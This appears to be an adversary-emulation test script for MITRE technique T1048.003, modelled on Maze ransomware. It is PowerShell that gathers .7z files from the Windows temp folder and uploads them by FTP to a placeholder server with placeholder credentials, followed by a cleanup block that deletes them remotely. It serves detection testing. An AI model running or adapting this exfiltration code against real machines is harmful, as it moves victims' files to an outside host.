#T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
#Joshua O. Cabauatan


#Test #6 - MAZE FTP Upload
$Dir_to_copy = "$env:windir\temp"
$ftp = "ftp://#{ftp_server}/"
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
if (test-connection -count 1 -computername "#{ftp_server}" -quiet)
{foreach($file in (dir $Dir_to_copy "*.7z"))
{echo "Uploading $file..."
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo "FTP Server Unreachable. Please verify the server address in input args and try again."}

#CleanupCommands:
#$ftp = "ftp://#{ftp_server}/"
try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
{$uri = New-Object System.Uri($ftp+$file.name)
 $ftp_del = [System.Net.FtpWebRequest]::create($uri)
 $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
 $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
 $ftp_del.GetResponse()}} catch{}